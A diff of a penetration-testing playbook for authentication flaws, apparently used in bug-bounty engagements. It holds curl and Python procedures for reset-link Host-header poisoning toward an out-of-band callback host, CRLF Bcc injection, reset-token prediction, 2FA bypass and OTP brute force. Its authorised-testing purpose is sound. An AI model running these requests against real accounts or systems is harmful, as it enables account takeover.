@@ -16,11 +16,11 @@
 
 Every other control assumes authentication worked, so a flaw here is rated on the end state. Any account taken
 with only its e-mail address and no interaction is critical: the reset link retrieved by the requester
-(#2293343, $35,000), the reset token returned in the HTTP response (#173551, $10,000), a recovery flow that
-skipped authentication (#2443228, $12,000). A requirement that an alternate path does not enforce is medium to
-high: a 2FA-only feature reached through an embedded form (#418767, $10,000), e-mail verification bypassed with
-an extra field (#1551176, $5,000) or for OAuth grants (#922456, $3,000). A short code with no attempt cap is
-high when the arithmetic is shown (#407971, $2,500; #730067, $3,000; #700612, $1,657).
+(#2293343, $35,000), the reset token returned in the HTTP response (#173551, $10,000), an account-recovery
+flow with improper authentication (#2443228, $12,000). A requirement that an alternate path does not enforce is
+medium to high: a 2FA-only feature reached through an embedded form (#418767, $10,000), e-mail verification
+bypassed with an extra field (#1551176, $5,000) or for OAuth grants (#922456, $3,000). A short code with no
+attempt cap is high when the arithmetic is shown (#407971, $2,500; #700612, $1,657; #1265709, $750).
 
 These flows are hand-written state machines: issue a secret, deliver it, check it, change the credential,
 revoke what existed before. Each transition is a place where the server can trust the wrong input: the header
@@ -70,7 +70,8 @@ scripts/sane fact set "$H" login=0 --ev "static docs; 'Sign in' links to account
 With `login` false the chapter closes for the asset; the planner writes the reason. When the login form lives
 on a central accounts host, run the chapter there and say so in the note. Write one line per flow (request,
 parameters, what is mailed or sent by SMS, what the last step returns) in `$E/recon/$H/map.md`: every item
-starts from those saved requests. All tests use our own accounts A and B; no item is ever aimed at a real user.
+starts from those saved requests. The paths in the items are examples; replace them with the saved ones. All
+tests run against our own accounts and mailboxes. No item is ever aimed at a real user.
 
 ## Triage order
 
@@ -105,13 +106,13 @@ usually excluded).
   sends the victim a genuine mail whose link points at the attacker's host; the click delivers the token.
   (B) The reset page loads third-party resources and the full URL, token included, goes out in `Referer` or in
   an analytics beacon.
-- **How:** (A) one reset request per header variant for our own account B, 30 seconds apart so a per-address
+- **How:** (A) one reset request per header variant for our own account, 30 seconds apart so a per-address
   throttle does not drop one silently. Each variant names its own callback host, so the mail shows which one
   worked.
   ```bash
-  EB='<B e-mail>'; D="$E/evidence/$H/AUT-001"; mkdir -p "$D"; U="$T/password/reset"
+  EV='<e-mail of our own account, the victim>'; D="$E/evidence/$H/AUT-001"; mkdir -p "$D"; U="$T/password/reset"
   rq(){ n=$1; shift; curl -sS --http1.1 "${HDR[@]}" -D "$D/$n.hdr" -o "$D/$n.body" -w "$n %{http_code}\n" -X POST \
-    -H 'Content-Type: application/json' -d "{\"email\":\"$EB\"}" "$@"; sleep 30; }
+    -H 'Content-Type: application/json' -d "{\"email\":\"$EV\"}" "$@"; sleep 30; }
   rq base  "$U"
   rq host  "$U" -H "Host: aut001-host.$OOB"
   rq xfh   "$U" -H "X-Forwarded-Host: aut001-xfh.$OOB"
@@ -121,7 +122,7 @@ usually excluded).
   rq fwd   "$U" -H "Forwarded: host=aut001-fwd.$OOB"
   rq port  "$U" -H "Host: $H:@aut001-port.$OOB"
   rq abs   "$U" --request-target "https://aut001-abs.$OOB/password/reset"
-  # save each raw mail from B's mailbox as $D/mail-<variant>.eml (decode quoted-printable), then list link hosts
+  # save each raw mail from the victim mailbox as $D/mail-<variant>.eml (decode quoted-printable), then list link hosts
   grep -aoE 'https?://[^/"<> ]+' "$D"/mail-*.eml | sort | uniq -c
   # the victim's click, done by us: the token must arrive at the callback host and then work on the real host
   curl -sS "${HDR[@]}" -o /dev/null '<poisoned link from the mail>'
@@ -130,7 +131,7 @@ usually excluded).
   (B) open a genuine reset link in the scriptable browser and print every request to another host that carries
   the token:
   ```python
-  # python3 aut001_referer.py '<genuine reset link from B mailbox>'
+  # python3 aut001_referer.py '<genuine reset link from the victim mailbox>'
   import sys, re
   from urllib.parse import urlparse
   from playwright.sync_api import sync_playwright
@@ -143,22 +144,23 @@ usually excluded).
               print('LEAK', r.method, r.url[:140], '| referer:', r.headers.get('referer', '-'))
       pg.on('request', seen); pg.goto(link, wait_until='networkidle'); pg.wait_for_timeout(3000); b.close()
   ```
-- **Proof:** for (A): the request with the forged header, the raw mail received by B whose link host is
-  `aut001-<variant>.$OOB`, the callback log line holding the token, and that token accepted by the real host
-  to set B's password. For (B): the captured request to the third party with the token in it, and the token
-  still accepted afterwards.
+- **Proof:** for (A): the request with the forged header, the raw mail received by our victim account whose
+  link host is `aut001-<variant>.$OOB`, the callback log line holding the token, and that token accepted by the
+  real host to set the account's password. For (B): the captured request to the third party with the token in
+  it, and the token still accepted afterwards.
 - **Not a finding when:** the forged host shows up in the HTTP response (a redirect, a canonical link) while the
-  mail still carries the real host: that is bare Host reflection (`host-header`, HHI chapter). The mail link
-  changes only for a `Host` value the front end would never route to this application from the internet and no
-  override header works. For (B): the request goes to a first-party host of the same organisation; the third
-  party receives only the origin because the browser default `strict-origin-when-cross-origin` strips path and
-  query (a leak then needs an explicit `Referrer-Policy: unsafe-url` or a script that reads `location.href`);
-  the token is consumed when the page loads. A token in `Referer` to an analytics vendor is closed as
-  informative on most programmes; report it only with a third party the attacker can read.
-- **Escalate:** take over B with the delivered token, then check whether the reset also logs in past the second
-  factor (AUT-006) and how long the token lives (AUT-004). When the host is filtered, a header that reaches only
-  the path or the scheme of the link still helps if the reset page has an open redirect (RDR chapter). A cached
-  poisoned reset page is CCH. AUT-018 supplies valid identifiers, but the proof stays on B.
+  mail still carries the real host: that is bare Host reflection (`host-header`, HHI chapter). Only a logo or
+  tracking-pixel URL in the mail follows the header and the reset link keeps the real host: content spoofing
+  at most (`content-spoofing`). For (B): the request goes to a first-party host of the same organisation; the
+  third party receives only the origin because the browser default `strict-origin-when-cross-origin` strips
+  path and query (a leak then needs an explicit `Referrer-Policy: unsafe-url` or a script that reads
+  `location.href`); the token is consumed when the page loads. A token in `Referer` to an analytics vendor is
+  closed as informative on most programmes; report it only with a third party the attacker can read.
+- **Escalate:** take the account over with the delivered token, then check whether the reset also logs in past
+  the second factor (AUT-006) and how long the token lives (AUT-004). A header that controls only the scheme
+  (`X-Forwarded-Proto: http`) is weaker: an `http://` link needs a network position (`mitm`). A reset page
+  that a shared cache stores with the poisoned host is CCH. AUT-018 supplies valid identifiers, but the proof
+  stays on our own account.
 
 ### AUT-002 · A password-reset or remember-me token can be computed from values the attacker knows
 
@@ -191,24 +193,24 @@ usually excluded).
   toks = [l.strip() for l in open(d + '/tokens.txt') if l.strip()]
   when = [int(email.utils.parsedate_to_datetime(re.search(r'(?im)^date:\s*(.+?)\r?$', open(f'{d}/req{i}.hdr').read()).group(1)).timestamp())
           for i in range(1, len(toks) + 1)]
+  ishex = lambda t: re.fullmatch(r'[0-9a-fA-F]+', t)
   print('distinct', len(set(toks)), 'of', len(toks), '| lengths', sorted({len(t) for t in toks}), '| alphabet', len(set(''.join(toks))))
   print('common prefix', repr(os.path.commonprefix(toks)[:40]))
   for t in toks[:2]:
-      try: print('base64 ->', base64.urlsafe_b64decode(t + '=' * (-len(t) % 4))[:80])
-      except Exception: pass
+      if not ishex(t):
+          try: print('base64 ->', base64.urlsafe_b64decode(t + '=' * (-len(t) % 4))[:80])
+          except Exception: pass
       if re.fullmatch(r'[0-9a-f]{8}-[0-9a-f]{4}-1[0-9a-f]{3}-[0-9a-f]{4}-[0-9a-f]{12}', t): print('UUIDv1: clock and node id, not random')
       if re.fullmatch(r'[0-9a-f]{24}', t): print('ObjectId-like: time', int(t[:8], 16), 'counter', int(t[18:], 16))
       if re.fullmatch(r'[0-9a-f]{13}', t): print('PHP uniqid-like: time', int(t[:8], 16), 'usec', int(t[8:], 16))
   if all(t.isdigit() for t in toks): print('numeric deltas', [int(b) - int(a) for a, b in zip(toks, toks[1:])])
   for t, ts in zip(toks, when):                      # plain hashes of known fields around the request second
-      if not re.fullmatch(r'[0-9a-fA-F]{32}|[0-9a-fA-F]{40}|[0-9a-fA-F]{64}', t): continue
-      parts = [em, em.lower(), uid] + [str(ts + k) for k in range(-3, 4)]
-      for n in (1, 2, 3):
-          for combo in itertools.permutations(parts, n):
-              for sep in ('', ':', '|', '-'):
-                  s = sep.join(combo).encode()
-                  for h in (hashlib.md5, hashlib.sha1, hashlib.sha256):
-                      if h(s).hexdigest() == t.lower(): print('MATCH', h.__name__, s, '->', t)
+      if len(t) not in (32, 40, 64) or not ishex(t): continue
+      parts = list(dict.fromkeys([em, em.lower(), uid] + [str(ts + k) for k in range(-3, 4)]))
+      cands = {sep.join(c) for n in (1, 2, 3) for c in itertools.permutations(parts, n) for sep in ('', ':', '|', '-')}
+      for s in cands:
+          for alg in ('md5', 'sha1', 'sha256'):
+              if hashlib.new(alg, s.encode()).hexdigest() == t.lower(): print('MATCH', alg, repr(s), '->', t)
   PY
   # remember-me cookie: log in twice with the box ticked and compare the two values the same way
   printf %s '<remember-me cookie value>' | tr '_-' '/+' | base64 -d 2>/dev/null | xxd | head
@@ -217,7 +219,8 @@ usually excluded).
   itsdangerous or Django signed value and `payload--signature` a Rails one: the offline crack is JWT-004.
 - **Proof:** a token for our own account computed from the request time and public fields before the mail was
   opened, equal to the mailed token (script input and output saved). For full impact the same computation for
-  B, accepted by the reset endpoint to set B's password, or a forged remember-me cookie returning B's profile.
+  our second account B, accepted by the reset endpoint to set B's password, or a forged remember-me cookie
+  returning B's profile.
 - **Not a finding when:** the value is 128 bits or more with no shared prefix, no decodable content and no time
   component: ten samples cannot prove a generator strong, they can only show structure, so record a negative.
   UUIDv4 is random. A visible user id or timestamp next to a random or MAC part predicts nothing. A signed
@@ -233,7 +236,7 @@ usually excluded).
 | | |
 |---|---|
 | **Severity** | Critical standalone: any account is taken with its e-mail address and no interaction |
-| **Requires** | password-reset, email-out, two-accounts |
+| **Requires** | password-reset, email-out, account |
 | **Excluded by** | — |
 | **Unit** | deployment |
 | **Cost** | low |
@@ -243,37 +246,40 @@ usually excluded).
 - **Where:** the request that asks for a reset mail, in every variant the product has (HTML form, JSON API,
   mobile API, GraphQL mutation). The same shape exists in "resend verification", magic-link login and
   invitation resend.
-- **Test:** the handler looks the account up with one value and mails to another, or accepts a list. Send
-  victim B's address together with attacker A's as an array, a duplicate parameter, a JSON list, a duplicate
-  JSON key, one string with a separator, a mail-header injection, and a query-string copy that overrides the
-  body. A hit is a mail in A's mailbox whose link resets B.
-- **How:** use the field name of the real request (`email`, `user[email]`, `login`, `username`). One request per
+- **Test:** the handler looks the account up with one value and mails to another, or accepts a list. Send the
+  victim's address together with a second address of ours as an array, a duplicate parameter, a JSON list, a
+  duplicate JSON key, one string with a separator, a mail-header injection, and a query-string copy that
+  overrides the body. A hit is a mail at the second address whose link resets the victim account.
+- **How:** use the field name of the real request (`email`, `user[email]`, `login`, `username`). The second
+  address has no account on the target, so any reset mail it receives belongs to the victim. One request per
   variant, 30 seconds apart; after each, look at both mailboxes.
   ```bash
-  EA='<A e-mail>'; EB='<B e-mail>'; D="$E/evidence/$H/AUT-003"; mkdir -p "$D"; U="$T/users/password"
+  EV='<e-mail of our own account, the victim>'; EM='<another address of ours, no account on the target>'
+  D="$E/evidence/$H/AUT-003"; mkdir -p "$D"; U="$T/users/password"
   f(){ n=$1; shift; curl -sS "${HDR[@]}" -o "$D/$n.body" -w "$n %{http_code} %{size_download}\n" -X POST "$@"; sleep 30; }
-  f arr-form  "$U" --data-urlencode "user[email][]=$EB" --data-urlencode "user[email][]=$EA"
-  f dup-form  "$U" --data-urlencode "email=$EB" --data-urlencode "email=$EA"
-  f dup-rev   "$U" --data-urlencode "email=$EA" --data-urlencode "email=$EB"
-  f arr-json  "$U" -H 'Content-Type: application/json' -d "{\"email\":[\"$EB\",\"$EA\"]}"
-  f dup-key   "$U" -H 'Content-Type: application/json' -d "{\"email\":\"$EB\",\"email\":\"$EA\"}"
-  f comma     "$U" --data-urlencode "email=$EB,$EA"
-  f semicolon "$U" --data-urlencode "email=$EB;$EA"
-  f space     "$U" --data-urlencode "email=$EB $EA"
-  f bcc       "$U" --data-urlencode "email=$EB"$'\r\n'"Bcc: $EA"
-  f query     "$U?email=$(printf %s "$EA" | sed 's/@/%40/; s/+/%2B/g')" --data-urlencode "email=$EB"
+  f arr-form  "$U" --data-urlencode "user[email][]=$EV" --data-urlencode "user[email][]=$EM"
+  f dup-form  "$U" --data-urlencode "email=$EV" --data-urlencode "email=$EM"
+  f dup-rev   "$U" --data-urlencode "email=$EM" --data-urlencode "email=$EV"
+  f arr-json  "$U" -H 'Content-Type: application/json' -d "{\"email\":[\"$EV\",\"$EM\"]}"
+  f dup-key   "$U" -H 'Content-Type: application/json' -d "{\"email\":\"$EV\",\"email\":\"$EM\"}"
+  f comma     "$U" --data-urlencode "email=$EV,$EM"
+  f semicolon "$U" --data-urlencode "email=$EV;$EM"
+  f space     "$U" --data-urlencode "email=$EV $EM"
+  f bcc       "$U" --data-urlencode "email=$EV"$'\r\n'"Bcc: $EM"
+  f query     "$U?email=$(printf %s "$EM" | sed 's/@/%40/; s/+/%2B/g')" --data-urlencode "email=$EV"
   ```
-  Open any reset link that arrives at A and read whose account the form names before submitting it.
-- **Proof:** the single request, the raw mail delivered to A containing a reset link, and that link setting a new
-  password on B: a login as B with the new password whose profile call returns B's user id. Both accounts are
-  ours.
-- **Not a finding when:** A receives a link that resets A's own account (the server treated the list as two
-  separate requests, each address getting its own token). The response is the same 200 for every variant and no
-  extra mail arrives: uniform answers are enumeration protection, not delivery. Only B receives mail. The
-  variant returns a 500 and nothing is sent.
-- **Escalate:** nothing higher exists; stop after one takeover of B. Then try the same variants on the other
-  mailed-secret flows (verification resend, magic link, e-mail-change confirmation, e-mailed 2FA codes) and name
-  every affected flow in one report.
+  Open any reset link that arrives at the second address and read whose account the form names before
+  submitting it.
+- **Proof:** the single request, the raw mail delivered to the second address containing a reset link, and that
+  link setting a new password on the victim account: a login with the new password whose profile call returns
+  the victim's user id. Account and both mailboxes are ours.
+- **Not a finding when:** the response is the same 200 for every variant and no extra mail arrives: uniform
+  answers are enumeration protection, not delivery. Only the victim address receives mail. The variant returns
+  a 500 and nothing is sent. The second address does have an account and the link it received resets that
+  account: the server treated the list as two separate requests.
+- **Escalate:** nothing higher exists; stop after one takeover of our own account. Then try the same variants
+  on the other mailed-secret flows (verification resend, magic link, e-mail-change confirmation, e-mailed 2FA
+  codes) and name every affected flow in one report.
 
 ### AUT-004 · A reset token stays valid after use, after a newer token, or after the password or e-mail changed
 
@@ -290,25 +296,25 @@ usually excluded).
 - **Where:** the reset link or code of every reset flow, and the equivalent tokens for e-mail change and
   e-mail verification.
 - **Test:** a reset token should die when it is used, when a newer one is issued, and when the credential it
-  recovers changes. Run five cases on our own account A: (a) use the token twice; (b) issue a second token and
+  recovers changes. Run five cases on our own account: (a) use the token twice; (b) issue a second token and
   use the first; (c) change the password in settings and then use a token issued before; (d) move the account
   to another address we own and then use the token mailed to the old address; (e) note the lifetime and retry a
   token at the next session.
-- **How:**
+- **How:** use account B when we hold two, so A's saved session and password stay as they are.
   ```bash
-  EA='<A e-mail>'; D="$E/evidence/$H/AUT-004"; mkdir -p "$D"
-  ask(){ curl -sS "${HDR[@]}" -o /dev/null -w "ask %{http_code}\n" -X POST "$T/password/reset" -H 'Content-Type: application/json' -d "{\"email\":\"$EA\"}"; sleep 30; }
+  EV='<e-mail of our own account under test>'; D="$E/evidence/$H/AUT-004"; mkdir -p "$D"; CT='Content-Type: application/json'
+  ask(){ curl -sS "${HDR[@]}" -o /dev/null -w "ask %{http_code}\n" -X POST "$T/password/reset" -H "$CT" -d "{\"email\":\"$EV\"}"; sleep 30; }
   use(){ curl -sS "${HDR[@]}" -o "$D/$1.body" -w "$1 %{http_code} %{size_download}\n" -X POST "$T/password/reset/confirm" \
-    -H 'Content-Type: application/json' -d "{\"token\":\"$2\",\"password\":\"$3\"}"; }
-  can(){ curl -sS "${HDR[@]}" -o /dev/null -w "login with $1: %{http_code}\n" -X POST "$T/api/login" -H 'Content-Type: application/json' -d "{\"email\":\"$EA\",\"password\":\"$1\"}"; }
+    -H "$CT" -d "{\"token\":\"$2\",\"password\":\"$3\"}"; }
+  can(){ curl -sS "${HDR[@]}" -o /dev/null -w "login with $1: %{http_code}\n" -X POST "$T/api/login" -H "$CT" -d "{\"email\":\"$EV\",\"password\":\"$1\"}"; }
   ask; T1='<token 1>'
   use first "$T1" 'Aut004-one!';  can 'Aut004-one!'      # control: must succeed
   use reuse "$T1" 'Aut004-two!';  can 'Aut004-two!'      # (a)
   ask; T2='<token 2>'; ask; T3='<token 3>'
   use older "$T2" 'Aut004-three!'; can 'Aut004-three!'   # (b)
-  ask; T4='<token 4>'   # now change the password in settings while logged in as A, then:
+  ask; T4='<token 4>'   # now change the password in settings while logged in, then:
   use after-change "$T4" 'Aut004-four!'; can 'Aut004-four!'   # (c)
-  ask; T5='<token 5>'   # now change A's e-mail to a second address of ours and confirm it, then:
+  ask; T5='<token 5>'   # now change the account e-mail to a second address of ours and confirm it, then:
   use after-move "$T5" 'Aut004-five!'                         # (d) then log in with the new address and this password
   ```
 - **Proof:** the table of cases with the response to each stale token and the login that shows the password it
@@ -345,30 +351,31 @@ usually excluded).
   (3) The step after the check carries nothing that proves the check passed: this is what "response
   manipulation" exploits, and without a proxy it is tested by sending the next request directly. For 2FA, the
   password step already returned a session that authenticated endpoints accept.
-- **How:** run the flow from a clean cookie jar against our own account B; the mailbox is read only to know what
+- **How:** run the flow from a clean cookie jar against our own account; the mailbox is read only to know what
   to search for.
   ```bash
-  EB='<B e-mail>'; D="$E/evidence/$H/AUT-005"; mkdir -p "$D"; J="$D/jar"; CT='Content-Type: application/json'
+  EV='<e-mail of our own account, the victim>'; PV='<its password>'
+  D="$E/evidence/$H/AUT-005"; mkdir -p "$D"; J="$D/jar"; CT='Content-Type: application/json'
   # 1. is the secret handed to the requester?
-  curl -sS "${HDR[@]}" -c "$J" -D "$D/send.hdr" -o "$D/send.body" -X POST "$T/api/password/forgot" -H "$CT" -d "{\"email\":\"$EB\"}"
-  CODE='<code or token from B mailbox>'
+  curl -sS "${HDR[@]}" -c "$J" -D "$D/send.hdr" -o "$D/send.body" -X POST "$T/api/password/forgot" -H "$CT" -d "{\"email\":\"$EV\"}"
+  CODE='<code or token from the victim mailbox>'
   grep -a -n -F "$CODE" "$D/send.hdr" "$D/send.body" "$J"
   for h in md5sum sha1sum sha256sum; do printf %s "$CODE" | $h | cut -d' ' -f1; done | grep -a -n -F -f - "$D/send.hdr" "$D/send.body"
   # 2. empty, null and missing values at the check
   for c in '"000000"' '""' 'null' 'true' '0' '[]'; do printf '%-9s ' "$c"; curl -sS "${HDR[@]}" -b "$J" -c "$J" -o "$D/verify.body" \
-    -w '%{http_code} %{size_download}\n' -X POST "$T/api/password/verify" -H "$CT" -d "{\"email\":\"$EB\",\"code\":$c}"; sleep 2; done
-  curl -sS "${HDR[@]}" -b "$J" -c "$J" -w 'no field %{http_code}\n' -o /dev/null -X POST "$T/api/password/verify" -H "$CT" -d "{\"email\":\"$EB\"}"
+    -w '%{http_code} %{size_download}\n' -X POST "$T/api/password/verify" -H "$CT" -d "{\"email\":\"$EV\",\"code\":$c}"; sleep 2; done
+  curl -sS "${HDR[@]}" -b "$J" -c "$J" -w 'no field %{http_code}\n' -o /dev/null -X POST "$T/api/password/verify" -H "$CT" -d "{\"email\":\"$EV\"}"
   # 3. the step after the check, from a client that never passed it
   curl -sS "${HDR[@]}" -b "$J" -o "$D/final.body" -w 'final %{http_code}\n' -X POST "$T/api/password/reset" -H "$CT" \
-    -d "{\"email\":\"$EB\",\"password\":\"Aut005-new-pw!\"}"
+    -d "{\"email\":\"$EV\",\"password\":\"Aut005-new-pw!\"}"
   # 2FA form: password step only, then an authenticated endpoint with whatever cookie or token it returned
-  curl -sS "${HDR[@]}" -c "$J.2fa" -o "$D/login.body" -X POST "$T/api/login" -H "$CT" -d "{\"email\":\"$EB\",\"password\":\"<B password>\"}"
+  curl -sS "${HDR[@]}" -c "$J.2fa" -o "$D/login.body" -X POST "$T/api/login" -H "$CT" -d "{\"email\":\"$EV\",\"password\":\"$PV\"}"
   curl -sS "${HDR[@]}" -b "$J.2fa" -o "$D/me.body" -w 'me before the code: %{http_code}\n' "$T/api/me"
   ```
   If the login response body holds a token instead of setting a cookie, send it as `Authorization: Bearer`.
-- **Proof:** from a client that holds only B's identifier (or, for 2FA, B's password): the response that
-  contains the secret, or the final request succeeding without a valid code, followed by a login as B with the
-  new password or a profile call returning B's data. Raw requests and responses saved.
+- **Proof:** from a client that holds only the account's identifier (or, for 2FA, its password): the response
+  that contains the secret, or the final request succeeding without a valid code, followed by a login with the
+  new password or a profile call returning the account's data. Raw requests and responses saved.
 - **Not a finding when:** flipping the check's response shows the next screen but the next API call is refused:
   the client moved, the server did not. The value in the response is a flow id, CSRF token or reset-session
   handle that still needs the code. The session returned by the password step reaches only the challenge,
@@ -397,35 +404,37 @@ usually excluded).
   a GraphQL login mutation, SSO buttons, magic links, the password-reset completion, embedded or partner forms,
   regional and seller portals on other hosts, and single endpoints that ask for the password again (delete
   account, export data, create API key).
-- **Test:** enable 2FA on our account B. Authenticate through each route with the password alone and call an
+- **Test:** enable 2FA on our own account. Authenticate through each route with the password alone and call an
   authenticated endpoint. The second factor was added to one login controller; the others were never told.
 - **How:**
   ```bash
-  EB='<B e-mail>'; PB='<B password>'; D="$E/evidence/$H/AUT-006"; mkdir -p "$D"; CT='Content-Type: application/json'
+  EV='<e-mail of our own account with 2FA enabled>'; PV='<its password>'
+  D="$E/evidence/$H/AUT-006"; mkdir -p "$D"; CT='Content-Type: application/json'
   chk(){ n=$1; shift; printf '%-9s ' "$n"; curl -sS "${HDR[@]}" -o "$D/$n.body" -w '%{http_code} %{size_download}\n' "$@"; sleep 1; }
-  chk basic   -u "$EB:$PB" "$T/api/v1/me"
-  chk ropc    -X POST "$T/oauth/token" -d grant_type=password --data-urlencode "username=$EB" --data-urlencode "password=$PB"
-  chk v1      -X POST "$T/api/v1/login" -H "$CT" -d "{\"email\":\"$EB\",\"password\":\"$PB\"}"
-  chk mobile  -X POST "$T/api/mobile/login" -H "$CT" -d "{\"email\":\"$EB\",\"password\":\"$PB\"}"
-  chk graphql -X POST "$T/graphql" -H "$CT" -d "{\"query\":\"mutation(\$e:String!,\$p:String!){login(email:\$e,password:\$p){token}}\",\"variables\":{\"e\":\"$EB\",\"p\":\"$PB\"}}"
+  chk basic   -u "$EV:$PV" "$T/api/v1/me"
+  chk ropc    -X POST "$T/oauth/token" -d grant_type=password --data-urlencode "username=$EV" --data-urlencode "password=$PV"
+  chk v1      -X POST "$T/api/v1/login" -H "$CT" -d "{\"email\":\"$EV\",\"password\":\"$PV\"}"
+  chk mobile  -X POST "$T/api/mobile/login" -H "$CT" -d "{\"email\":\"$EV\",\"password\":\"$PV\"}"
+  chk graphql -X POST "$T/graphql" -H "$CT" \
+    -d '{"query":"mutation($e:String!,$p:String!){login(email:$e,password:$p){token}}","variables":{"e":"'"$EV"'","p":"'"$PV"'"}}'
   # login-shaped routes the UI does not use
   grep -rhoE "[\"'\`]/[A-Za-z0-9_/.-]*(login|signin|sign_in|session|token|authenticate)[A-Za-z0-9_/.-]*" "$E/recon/$H/js/" | sort -u
   # a token from any of them, then data:
   curl -sS "${HDR[@]}" -H 'Authorization: Bearer <token from an alternate route>' -w '\n%{http_code}\n' "$T/api/me"
   ```
-  Reset path: complete a password reset for B and see whether the response sets an authenticated session
-  without the code. SSO path (only when `oauth-login` holds and we own an IdP identity with B's address): sign
-  in through the IdP in the scriptable browser and see whether the challenge appears.
-- **Proof:** B's settings showing 2FA enabled, the normal web login stopping at the challenge, and the alternate
-  route returning a session or token that reads B's private data, all without a code.
-- **Not a finding when:** the alternate token is scope-limited and data endpoints refuse it. The credential is an
-  API key or app password that the user created inside a 2FA session: that is the documented exemption. The
-  account was created through the IdP and the product delegates the second factor to it. "Remember this
+  Reset path: complete a password reset for the account and see whether the response sets an authenticated
+  session without the code. SSO path (only when `oauth-login` holds and we own an IdP identity with the
+  account's address): sign in through the IdP in the scriptable browser and see whether the challenge appears.
+- **Proof:** the account's settings showing 2FA enabled, the normal web login stopping at the challenge, and the
+  alternate route returning a session or token that reads the account's private data, all without a code.
+- **Not a finding when:** the alternate token is scope-limited and data endpoints refuse it. The credential is
+  an API key or app password that the user created inside a 2FA session: that is the documented exemption.
+  The account was created through the IdP and the product delegates the second factor to it. "Remember this
   device" skips the challenge on the browser that already passed it. The reset completes and then asks for the
   code before any session exists.
 - **Escalate:** a route that needs no password (SSO attached by e-mail match, reset auto-login combined with
-  AUT-001 or AUT-003) is takeover of 2FA accounts. A password-only destructive endpoint is shown on B once and
-  not repeated. From the session obtained, AUT-009 removes the factor.
+  AUT-001 or AUT-003) is takeover of 2FA accounts. A password-only destructive endpoint is shown once on our
+  own account and not repeated. From the session obtained, AUT-009 removes the factor.
 
 ### AUT-007 · A one-time code or backup code is accepted twice, or on another account's challenge
 
@@ -489,29 +498,33 @@ usually excluded).
 | **Prior art** | #407971, #700612, #1265709, #743545 |
 
 - **Where:** any check of a four to eight digit secret: reset code, one-time login code, 2FA challenge, e-mail
-  or phone verification code, recovery PIN. Not long random tokens. `rate-limit` in the policy does not close
-  this item when the code is an authentication factor; `bruteforce-ok` is the gate, and its absence blocks it.
+  or phone verification code, recovery PIN. Not long random tokens. A `rate-limit` exclusion does not close
+  this item when the code is an authentication factor; `bruteforce-ok` is the gate, and without it the planner
+  closes the item.
 - **Test:** find what bounds guessing: a cap per code, a lockout per account, a cap per session or per IP, the
   code lifetime, and whether a resend resets the counter while the old code stays valid. Then show, on our own
-  account B and at the engagement rate, that many consecutive wrong codes are evaluated and the right one is
+  account and at the engagement rate, that many consecutive wrong codes are evaluated and the right one is
   still accepted.
-- **How:** stage 1 costs 26 requests and decides the item. Trigger a code for B, read it, do not use it.
+- **How:** stage 1 costs 26 requests and decides the item. Trigger a code for our account, read it, do not use
+  it. The helper assumes six digits; change `%06d` and the modulus for another length.
   ```bash
-  EB='<B e-mail>'; GOOD='<code from B mailbox>'; D="$E/evidence/$H/AUT-008"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
+  EV='<e-mail of our own account, the victim>'; GOOD='<code from its mailbox>'
+  D="$E/evidence/$H/AUT-008"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
   try(){ curl -sS "${HDR[@]}" -o "$D/last.body" -w '%{http_code} %{size_download}' -X POST "$T/api/login/code" \
-    -H 'Content-Type: application/json' -d "{\"email\":\"$EB\",\"code\":\"$1\"}"; }
+    -H 'Content-Type: application/json' -d "{\"email\":\"$EV\",\"code\":\"$1\"}"; }
   run(){ for i in $(seq "$1" -1 1); do c=$(printf '%06d' $(( (10#$GOOD - i + 1000000) % 1000000 ))); echo "$c $(try "$c")"; sleep "$W"; done
          echo "GOOD $GOOD $(try "$GOOD")"; }
   run 25 | tee "$D/stage1.txt"        # 25 wrong codes, then the real one
-  # stage 2, only if stage 1 ended in a session: a fresh code, then K wrong codes and the real one.
-  # K is the policy's ceiling when it names one; 2000 otherwise. A four-digit code is run whole: seq -w 0 9999
+  # stage 2, only if stage 1 ended in a session: request a fresh code, set GOOD, then K wrong codes and the real one.
+  # K is the policy's ceiling when it names one, 2000 otherwise. A four-digit code is run whole (K=9999).
   run 2000 | tee "$D/stage2.txt"
-  awk '{print $2, $3}' "$D/stage2.txt" | sort | uniq -c    # every wrong code must have the same ordinary answer
+  grep -v '^GOOD' "$D/stage2.txt" | awk '{print $2, $3}' | sort | uniq -c    # every wrong code: the same ordinary answer
   ```
 - **Proof:** the log of K consecutive wrong codes, each answered as an ordinary wrong code, with the real code
-  accepted at the end and B's session issued; the code length and measured lifetime; and the arithmetic: space
-  S, lifetime L seconds, R requests per second evaluated, so each issued code falls with probability L·R/S and
-  an attacker who keeps requesting codes expects S/(L·R) rounds. For a four-digit code, the complete blind run.
+  accepted at the end and a session issued for our account; the code length and measured lifetime; and the
+  arithmetic: space S, lifetime L seconds, R requests per second evaluated, so each issued code falls with
+  probability L·R/S and an attacker who keeps requesting codes expects S/(L·R) rounds. For a four-digit code,
+  the complete blind run.
 - **Not a finding when:** the real code is refused at the end: a cap exists even though wrong codes kept
   returning the same 200 (silent lockout), so always finish with the known code. The account or code locks
   after a few tries. The limiter is per IP and nothing but real address rotation defeats it (AUT-010 covers
@@ -519,7 +532,7 @@ usually excluded).
   authenticates: a newsletter confirmation or a coupon is `rate-limit` material.
 - **Escalate:** where a limiter exists, AUT-010 for client-controlled keys, GQL-007 for hundreds of guesses in
   one batched GraphQL request, and the RAC chapter for parallel guesses that land before the counter updates.
-  A reset code that falls this way is takeover of any account by identifier: prove it on B only.
+  A reset code that falls this way is takeover of any account by identifier: prove it on our own account only.
 
 ### AUT-009 · Two-factor settings are disabled or replaced without the current code or password
 
@@ -549,7 +562,7 @@ usually excluded).
   curl -sS "${HDR[@]}" $A -o "$D/backup.body" -w 'new backup codes %{http_code}\n' -X POST "$T/api/2fa/backup_codes" -H "$CT" -d '{}'
   curl -sS "${HDR[@]}" $A -o "$D/setup.body"  -w 'new secret %{http_code}\n'       -X POST "$T/api/2fa/setup" -H "$CT" -d '{}'
   grep -aoiE '"(secret|otpauth_url|codes|backup_codes)":' "$D/backup.body" "$D/setup.body"
-  # the same calls with the cookie jar from AUT-005 that holds only the password-step session
+  # the same call with the cookie jar from AUT-005 that holds only the password-step session
   curl -sS "${HDR[@]}" -b "$E/evidence/$H/AUT-005/jar.2fa" -w 'pre-2FA session disable %{http_code}\n' -o /dev/null -X POST "$T/api/2fa/disable" -H "$CT" -d '{}'
   ```
   Enable 2FA on the account again afterwards.
@@ -637,8 +650,8 @@ usually excluded).
   Our tenant only: default passwords are never tried on a tenant, panel or user that is not ours.
